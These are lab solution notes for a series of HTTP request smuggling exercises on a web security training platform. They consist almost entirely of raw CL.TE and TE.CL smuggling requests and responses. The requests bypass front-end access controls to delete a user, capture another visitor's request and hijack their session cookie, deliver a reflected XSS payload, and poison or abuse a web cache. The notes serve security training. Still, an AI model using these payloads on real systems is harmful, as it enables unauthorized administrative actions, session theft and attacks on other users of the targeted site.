# HTTP request smuggling

## How to perform an HTTP request smuggling attack

### HTTP request smuggling, basic CL.TE vulnerability
1st request
```
POST /post/comment HTTP/1.1
...
Transfer-Encoding: chunked

0

G
---
HTTP/1.1 400 Bad Request
Content-Type: application/json
Keep-Alive: timeout=0
Connection: close
Content-Length: 19

"Missing parameter"
```

2nd request
```
POST /post/comment HTTP/1.1
...
Transfer-Encoding: chunked

0

G
---
HTTP/1.1 403 Forbidden
Content-Type: application/json
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```

### HTTP request smuggling, basic TE.CL vulnerability
Send twice
```
POST / HTTP/1.1
Host: acba1f431f8efb5580ada06100c10063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, obfuscating the TE header
Send twice
```
POST / HTTP/1.1
Host: ac131f3b1f7bfd5b80f42b080013003d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: hello

12
GPOST / HTTP/1.1

0


```

## Finding HTTP request smuggling vulnerabilities

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Send twice
```
POST / HTTP/1.1
Host: ac251f381f1a5d6a804fc8a300f20094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Send twice
```
POST / HTTP/1.1
Host: acf51f6c1e75983c805a039b004500bc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## Exploiting HTTP request smuggling vulnerabilities

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Send twice
```
POST /home HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
Transfer-Encoding: chunked
Content-Length: 103

0

GET /admin HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Foo: x

---
HTTP/1.1 401 Unauthorized
...
Admin interface only available if logged in as an administrator, or if requested as localhost
```

Add `Host: localhost` and make sure that the smuggled header is not overwritten:
```
POST /home HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
Transfer-Encoding: chunked
Content-Length: 116

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Delete Carlos:
```
POST /home HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
Transfer-Encoding: chunked
Content-Length: 139

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Send twice
```
POST /home HTTP/1.1
Host: ac6a1fa81f845ee4809d8af400a200d8.web-security-academy.net
Cookie: session=EzC4LN9GCRzow1Np5ukNkgaFzcBSZbxf
Transfer-Encoding: chunked
Content-Length: 4

86
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```

### Exploiting HTTP request smuggling to reveal front-end request rewriting
Send twice
```
POST / HTTP/1.1
Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
Transfer-Encoding: chunked
Content-Length: 124

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test

---

<h1>0 search results for 'testPOST / HTTP/1.1
X-dAEOCl-Ip: 78.102.57.9
Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
Transfer-Encoding: chunked
Con'</h1>
```

The header name is `X-dAEOCl-Ip`.

Delete Carlos:
```
POST /home HTTP/1.1
Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
Transfer-Encoding: chunked
Content-Length: 146

0

GET /admin/delete?username=carlos HTTP/1.1
X-dAEOCl-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Exploiting HTTP request smuggling to capture other users' requests
Repeat the attack until the next refresh is without error: 
```
POST / HTTP/1.1
Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 323

0

POST /post/comment HTTP/1.1
Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 585
Cookie: session=9hj8i51OHzaciLprwoDlAmwElyptUvqA

csrf=VLe2ebCmhGG941T4MLdjYtdOPFOJvsPU&postId=1&name=Jan+Verner&email=xxx%40gmail.com&website=&comment=
```

Once successful, a new comment is added:
```
GET / HTTP/1.1 Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/338621 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate, br Cookie: session=buqpdsiu1uTzQN5tSOvGtTCVtpXIjhux
```

Grab the cookie and get `/` with it
```
GET / HTTP/1.1
Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net
Cookie: session=buqpdsiu1uTzQN5tSOvGtTCVtpXIjhux
```

### Exploiting HTTP request smuggling to deliver reflected XSS
Send repeatedly:
```
POST / HTTP/1.1
Host: ac921f6f1ed2cd8a80094450003d004b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Transfer-Encoding: chunked

0

GET /post?postId=3 HTTP/1.1
Host: ac921f6f1ed2cd8a80094450003d004b.web-security-academy.net
User-Agent: a"/><script>alert('hello')</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

### Exploiting HTTP request smuggling to perform web cache poisoning
Setup the poison request:
```
POST / HTTP/1.1
Host: ac891f541f1ede2c80b356d0007a0090.web-security-academy.net
Content-Length: 177
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Cookie: session=zY91vjxzDBEbrxMtpRfAP5D2ExB7mdOG

0

GET /post/next?postId=3 HTTP/1.1
Host: ac361f2a1fc9deb68076563e01340012.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

y=
```

Poison the cache by calling https://ac891f541f1ede2c80b356d0007a0090.web-security-academy.net/resources/js/tracking.js

You should get redirect to exploit server.

### Exploiting HTTP request smuggling to perform web cache deception
Setup the poison request:
```
POST / HTTP/1.1
Host: ac9d1f341e9a424c80db6c4b00130068.web-security-academy.net
Cookie: session=n6qQ6HBFOCVjk7Knrwv3pLbnvB3M6KvC
Transfer-Encoding: chunked
Content-Length: 39

0

GET /my-account HTTP/1.1
X-Foo: x
```

Deceive the cache by calling https://ac9d1f341e9a424c80db6c4b00130068.web-security-academy.net/resources/js/tracking.js

You should get the victim's account detail now.
